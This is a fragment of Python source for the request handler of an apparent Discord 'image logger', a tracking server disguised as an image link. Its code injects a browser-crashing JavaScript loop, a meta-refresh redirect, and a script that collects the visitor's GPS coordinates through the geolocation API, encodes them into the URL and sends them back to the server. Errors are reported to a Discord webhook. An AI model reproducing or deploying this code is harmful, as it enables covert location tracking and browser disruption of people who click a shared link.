                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
